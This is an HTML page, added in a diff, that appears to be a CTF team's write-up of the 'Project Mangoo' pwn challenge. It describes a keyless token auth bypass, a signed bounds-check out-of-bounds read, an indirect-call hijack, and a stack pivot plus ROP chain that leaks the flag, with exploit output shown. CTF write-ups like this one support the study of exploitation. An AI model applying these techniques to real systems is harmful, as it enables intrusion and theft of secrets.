@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Project Mangoo · HICyberCon CTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="The handshake token is a fixed transform of the challenge with no key involved. Query Channel only bounds the index from above, so negative indices leak memory, and the leaked pointers set up a pivot that reaches the flag without gadgets or shellcode." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=9bb4ee8e" />
+<link rel="stylesheet" href="../css/pages.css?v=15906e9c" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <a href="../events/hicybercon-ctf-2026.html">hicybercon-ctf-2026</a> <span aria-hidden="true">/</span> <span>project-mangoo</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>Project Mangoo <span class="page-sub">Keyless handshake, OOB read, stack pivot</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-pwn">pwn</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">hiCTF{n0_g4dg3ts_n0_sh3llc0d3_jusT_p1v0t_d33p3r_1bcb244b04}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<p>Target: MinGW/GCC Windows PE x64 (<code>project_mangoo.exe</code>), run under Wine in the
+challenge container (<code>ubuntu</code> + wine). Live: <code>project-mangoo-a4fe87d10772.chall.hiddeninvestigations.net:1337</code> (TLS).
+Local repro: <code>docker run -d --name mangoo_local -p 17250:7250 -e MANGOO_ROOT_KEY=hiCTF{local_placeholder_flag} mangoo-local</code></p>
+<h2 id="protocol"><a class="wu-anchor" href="#protocol" aria-hidden="true">#</a>Protocol</h2>
+<p>Banner <code>PROJECT MANGOO</code> → <code>[*] Session Challenge: &lt;64 hex&gt;</code> → <code>[*] Authorization Token:</code> (5 s window).
+Then <code>GATEWAY CONSOLE</code> with options: 1 Ingest Telemetry, 2 Query Channel, 3 Commit Configuration,
+4 System Status, 5 Terminate, 6 Sync Channel.</p>
+<h2 id="vuln-1-handshake-token-is-keyless-auth-bypass-working-on-live"><a class="wu-anchor" href="#vuln-1-handshake-token-is-keyless-auth-bypass-working-on-live" aria-hidden="true">#</a>VULN 1 - Handshake token is KEYLESS (auth bypass)  ✔ working on live</h2>
+<p>Verify loop at <code>0x14001a4b1</code> compares our 32 decoded bytes (r12) against
+<code>[rdi+rdx+0x20]</code> (= the 32 challenge bytes) transformed as:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-text">token[i] = ((challenge[i] ROL 3) ^ (0x11*i) ^ 0x6a) &amp; 0xff</code></pre>
+      
+    </figure><p>No involvement of <code>MANGOO_ROOT_KEY</code> (getenv&#39;d at 0x140019d78, stored [rbx+0x50]).
+=&gt; Anyone who can compute the transform authenticates. Implemented in <code>exploit.py</code>.</p>
+<h2 id="vuln-2-query-channel-signed-16-bit-bounds-check-oob-read-"><a class="wu-anchor" href="#vuln-2-query-channel-signed-16-bit-bounds-check-oob-read-" aria-hidden="true">#</a>VULN 2 - Query Channel: signed 16-bit bounds check → OOB read  ✔</h2>
+<p>Handler <code>0x14001a078</code>: <code>call atoi</code> → <code>cmp ax,0xf; jg out_of_bounds</code> - SIGNED 16-bit upper
+bound only. Negative indices pass. It then reads a 32-byte-strided struct:</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-text">ID/Status = *(u32*)(rsi + idx*0x20 + 0x60 / +0x64)
+Label    = *(u64*)(rsi + idx*0x20 + 0x68)
+Ref      = *(u64*)(rsi + idx*0x20 + 0x70)</code></pre>
+      
+    </figure><p>=&gt; OOB memory disclosure (24 of every 32 bytes) walking <em>down</em> from the channel array.
+Leaks code, heap and Wine-stack pointers (see <code>dump2.py</code> / <code>oob.txt</code>).</p>
+<h2 id="vuln-3-sync-channel-oob-driven-indirect-call-"><a class="wu-anchor" href="#vuln-3-sync-channel-oob-driven-indirect-call-" aria-hidden="true">#</a>VULN 3 - Sync Channel: OOB-driven indirect call  ✔</h2>
+<p>Handler <code>0x140019fa8</code> (jump table @0x14001d394, option 6):</p>
+<figure class="wu-code wu-code-output" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-text">rdx = *(u64*)(rsi + idx*0x20 + 0x58)      ; OOB pointer
+rdx = *(u64*)(rdx + 0x10)                 ; target
+cmp rdx, 0x140019cb0                      ; legit sync fn
+jne -&gt; call rdx                           ; rcx = &amp;(rsi+idx*0x20+0x58)</code></pre>
+      
+    </figure><p>Legit channels 0..15 print <code>[+] Channel &lt;0x20260000+idx&gt; synced.</code>; negative indices
+reach garbage → <code>wine: Unhandled page fault ... at 0x14001A01D</code> (the <code>[rdx+0x10]</code> deref).</p>
+<h2 id="controlled-oob-buffer"><a class="wu-anchor" href="#controlled-oob-buffer" aria-hidden="true">#</a>Controlled OOB buffer</h2>
+<p>The token line is read with <code>fgets(buf,0x80)</code> into a stack buffer <strong>inside the OOB window</strong>
+at <code>rsi-0xE0</code> (verified with a marker: <code>idx=-8</code> read back <code>MARKERZZMARKERZZ</code>).
+So ~63 bytes AFTER the 64-hex token are attacker-controlled AND OOB-readable.
+With a fake descriptor placed there, idx∈{-9..-6} makes VULN 3 read our pointer and
+<code>call</code> an address of our choosing with <code>rcx</code> pointing into our own controlled bytes.</p>
+<h2 id="where-the-flag-is"><a class="wu-anchor" href="#where-the-flag-is" aria-hidden="true">#</a>Where the flag is</h2>
+<p><code>MANGOO_ROOT_KEY</code> is copied (strncpy, 0x100) into a <strong>separate</strong> 0x4000 heap buffer
+(<code>[rbx+0x50]</code>, likely the <code>0x7f0000</code> pointer seen at idx -1 Ref); the <em>labels/descriptors</em>
+buffer is <code>[rbx+0x18]</code> (= 0x7e0000, channel-0 <code>Ref</code>). The key is never printed or used -
+it can only be recovered by a read primitive on that buffer.
+Ingest writes <code>[rbx+0x18]</code> only (confirmed: pattern-fill did NOT affect channels or the
+sync descriptor), so corrupting descriptors does not clobber the key.</p>
+<h2 id="full-exploit"><a class="wu-anchor" href="#full-exploit" aria-hidden="true">#</a>Full exploit</h2>
+<p>Ingest is NOT needed. Everything is done with one crafted auth line + Sync Channel idx=-8.</p>
+<p>Layout facts (stable - Wine, no <button type="button" class="wu-gloss" data-def="Address Space Layout Randomization: randomizes memory addresses each run to make exploits harder to write reliably.">ASLR</button> on these regions):</p>
+<ul>
+<li>allocA (labels/descriptors, <code>[rbx+0x18]</code>, ingest target) = <code>0x7e0000</code></li>
+<li>allocB (<strong>MANGOO_ROOT_KEY</strong>, <code>[rbx+0x50]</code>)              = <code>0x7f0000</code>  (leaked as idx=-1&#39;s <code>Ref</code>)</li>
+<li>auth line buffer (<code>fgets(0x80)</code>) base = <code>0x31f9d0</code> (= rsi-0xF0, rsi=0x31fac0)</li>
+</ul>
+<p>Steps:</p>
+<ol>
+<li>Auth bypass (VULN 1) and craft the line as: 64-char token hex, then at
+offset 0x48 <code>p64(0x31fa10)</code> (fake descriptor pointer) and at 0x50 <code>p64(PIVOT)</code>.</li>
+<li><code>Sync Channel</code> with idx = <strong>-8</strong> (VULN 2 + 3): slot = <code>rsi-0x100+0x58</code> = BASE+0x48.
+<code>rdx = *(slot) = 0x31fa10 ; rdx = *(rdx+0x10) = *(0x31fa20) = PIVOT</code> -&gt; <code>cmp</code> fails
+(<code>!= 0x140019cb0</code>) -&gt; <code>call rdx</code>, with <code>rcx = &amp;slot</code>.</li>
+<li><code>PIVOT</code> @ <code>0x1400016d0</code>: <code>mov rax,[rcx]</code> (= 0x31fa10) ; <code>mov rsp,rax</code> ;
+<code>add rsp,0x18</code> ; <code>ret</code>  -&gt;  RSP = <code>0x31fa28</code>, i.e. <strong>inside our own line on the real stack</strong>
+(pivoting into the heap instead makes Wine&#39;s msvcrt crash, so the stack pivot matters).</li>
+<li><button type="button" class="wu-gloss" data-def="Return-oriented programming: chaining existing code fragments (gadgets) via the stack to execute arbitrary logic without injecting new code.">ROP</button> chain (written at line offset 0x58): <code>pop rcx ; ret</code> (0x14000bd60) /
+<code>0x7f0000</code> / local printf wrapper <code>0x140018c90</code> (takes the format string in rcx, so
+passing the key buffer prints it directly) / <code>exit</code> (0x1400183e0).</li>
+<li>Output: the key is printed.</li>
+</ol>
+<p>Local verification:</p>
+<figure class="wu-code wu-code-output" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-text">$ python3 exploit_rop2.py local
+[+] authenticated
+OUT: b'hiCTF{local_placeholder_flag}'
+FLAG: hiCTF{local_placeholder_flag}</code></pre>
+      
+    </figure><p>(reliable 2/2 runs)</p>
+<p>Live: <code>python3 exploit_rop2.py tls &lt;host&gt; &lt;port&gt; 0x7f0000</code> (allocate a fresh instance).</p>
+<h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>Flag</h2>
+<p><strong>FLAG: <code>hiCTF{n0_g4dg3ts_n0_sh3llc0d3_jusT_p1v0t_d33p3r_1bcb244b04}</code></strong></p>
+<p>Captured live (<code>project-mangoo-916b618571c6.chall.hiddeninvestigations.net:1337</code>, TLS):</p>
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-text">$ python3 exploit_rop2.py tls &lt;host&gt; 1337 0x7f0000
+[+] authenticated
+OUT: b'hiCTF{n0_g4dg3ts_n0_sh3llc0d3_jusT_p1v0t_d33p3r_1bcb244b04}'</code></pre>
+      
+    </figure><p>(The flag text is the intended solution in a nutshell: &quot;no gadgets, no shellcode, just
+pivot deeper&quot; - i.e. don&#39;t fight the heap stack, pivot into the real stack.)</p>
+<p>Live layout identical to local: allocA <code>0x7e0000</code>, key buffer <code>0x7f0000</code>.</p>
+
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#protocol">Protocol</a></li><li><a href="#vuln-1-handshake-token-is-keyless-auth-bypass-working-on-live">VULN 1 - Handshake token is KEYLESS (auth bypass)  ✔ working on live</a></li><li><a href="#vuln-2-query-channel-signed-16-bit-bounds-check-oob-read-">VULN 2 - Query Channel: signed 16-bit bounds check → OOB read  ✔</a></li><li><a href="#vuln-3-sync-channel-oob-driven-indirect-call-">VULN 3 - Sync Channel: OOB-driven indirect call  ✔</a></li><li><a href="#controlled-oob-buffer">Controlled OOB buffer</a></li><li><a href="#where-the-flag-is">Where the flag is</a></li><li><a href="#full-exploit">Full exploit</a></li><li><a href="#flag">Flag</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="titan-relay.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">Titan Relay</span></a>
+    <a class="wu-pager-link wu-pager-next" href="letmeout.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">LetMeOut</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=2912532e"></script>
+</body>
+</html>
